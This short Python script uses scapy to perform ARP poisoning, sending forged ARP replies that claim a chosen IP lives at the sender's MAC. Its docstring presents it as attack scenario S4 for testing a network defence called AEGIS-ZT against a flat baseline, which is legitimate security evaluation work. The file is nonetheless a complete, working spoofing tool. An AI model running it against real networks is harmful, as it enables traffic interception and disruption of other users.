#!/usr/bin/env python3
"""S4 ARP poisoning: claim that --claim IP (e.g. web1) lives at this host's MAC.
Sends forged ARP replies to each victim once per second (scapy, needs root).
On AEGIS-ZT (B1/B2) the controller sees the forged reply, never forwards it,
and penalises the sender (E5). On the flat baseline (B0) it is broadcast.
"""
import argparse
import time

from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp

ap = argparse.ArgumentParser()
ap.add_argument("--claim", required=True)
ap.add_argument("--victims", required=True, help="comma-separated IPs")
ap.add_argument("--iface", default=None)
a = ap.parse_args()

iface = a.iface or conf.iface
mac = get_if_hwaddr(iface)
victims = a.victims.split(",")
while True:
    for v in victims:
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) /
              ARP(op=2, psrc=a.claim, hwsrc=mac, pdst=v, hwdst="ff:ff:ff:ff:ff:ff"),
              iface=iface, verbose=False)
    time.sleep(1)
